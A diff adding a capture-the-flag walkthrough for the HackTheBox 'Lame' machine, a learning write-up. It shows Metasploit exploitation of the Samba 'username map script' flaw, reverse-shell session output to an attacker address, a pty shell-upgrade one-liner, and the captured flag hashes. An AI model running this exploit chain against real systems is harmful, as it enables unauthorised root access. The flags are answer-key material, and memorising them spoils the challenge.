@@ -1,0 +1,195 @@
+#####################
+# Sources and links #
+#####################
+https://jonathansblog.co.uk/metasploit-tutorial-for-beginners
+https://jaimelightfoot.com/blog/hackthebox-lame-retired-walkthrough/
+
+#########
+# TL,DR #
+#########
+An insecure samba port is on port 139. Metasploit has a module that grants root access.
+
+###############
+# Walkthrough #
+###############
+A quick nmap scan reveals ftp, ssh, netbios-ssn, and microsoft-ds.
+-Pn had to be used as an nmap argument because 'Host is down' message
+was recieved without it.
+
+A more in-depth nmap scan shows some details.
+
+First, let's examine the anonymous ftp login 
+$ftp 10.10.10.3
+username: anonymous
+password: anything
+We are dropped into an empty root folder with no files in it.
+
+Return to localhost and examine the nmap scan for the ftp port:
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+
+vsftpd is an FTP server for unix systems. 
+As of July 15, 2015, vsfptd is version 3.0.3, so 2.3.4 is likely insecure.
+Let's see what metaspolit has to offer.
+
+Start metasploit:
+msfdb start
+msfconsole
+
+msf5 > search vsfptd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
+   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
+   2  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+3 looks excellent... let's try it out.
+
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
+   RPORT   21               yes       The target port (TCP)
+
+msf5 > set RHOSTS 10.10.10.3
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+# Tried typing in gibberish && || nothing...
+[*] Exploit completed, but no session created.
+
+Dang. Let's examine the nmap scan again:
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+
+Search metasploit for Samba smb 3.0.20
+There is a ton of results, but we can narrow them down with search terms:
+msf5 > search rank:excellent platform:linux platform:unix Samba smbd 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   1  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
+   2  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   3  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   4  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+
+We can examine the first result and see if it is relevant to our situation:
+e exploit/linux/samba/is_known_pipename
+msf5 exploit(linux/samba/is_known_pipename) > show info
+
+       Name: Samba is_known_pipename() Arbitrary Module Load
+     Module: exploit/linux/samba/is_known_pipename
+(Some content excluded)
+Basic options:
+  Name            Current Setting  Required  Description
+  ----            ---------------  --------  -----------
+  RHOSTS                           yes       The target address range or CIDR identifier
+  RPORT           445              yes       The SMB service port (TCP)
+  SMB_FOLDER                       no        The directory to use within the writeable SMB share
+  SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+Payload information:
+  Space: 9000
+
+Description:
+  This module triggers an arbitrary shared library load vulnerability
+  in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module
+  requires valid credentials, a writeable folder in an accessible
+  share, and knowledge of the server-side path of the writeable
+  folder. In some cases, anonymous access combined with common
+  filesystem locations can be used to automatically exploit this
+  vulnerability.
+
+The description shows that this is not the right exploit to use. Let's try the next one:
+
+msf5 exploit(linux/samba/is_known_pipename) > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > show info
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands. No authentication is needed to exploit this vulnerability
+  since this option is used to map usernames prior to authentication!
+
+Looks promising, let's try it!
+
+msf5 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target address range or CIDR identifier
+   RPORT   139              yes       The target port (TCP)
+
+msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+
+
+msf5 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP double handler on 10.10.14.40:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo raHg4KfZJZsagpfQ;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "raHg4KfZJZsagpfQ\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.40:4444 -> 10.10.10.3:44675) at 2019-07-28 18:42:51 -0600
+
+And we're in with a root shell!
+
+The prompt is blank, and it can be cleaned up using:
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-3.2# cd ~/Desktop
+cd ~/Desktop
+sh-3.2# find / -name root.txt
+find / -name root.txt
+/root/root.txt
+sh-3.2# cat /root/root.txt
+cat /root/root.txt
+92caac3be140ef409e45721348a4e9df
+
+Now we just navigate to the user's Desktop to get usr.txt:
+sh-3.2# cd /home
+cd /home
+sh-3.2# ls
+ls
+ftp  makis  service  user
+sh-3.2# cat makis/user.txt
+cat makis/user.txt
+69454a937d94f5f0225ea00acd2e84c5
+
+Lame successfully hacked!
+
+###########
+# Learned #
+###########
+
+Simplifying metasploit searches using:
+msf> search seachTermHere platform:linux, rank:excellent
+
+spawning a better shell with:
+ python -c 'import pty; pty.spawn("/bin/sh")'
+ 
+
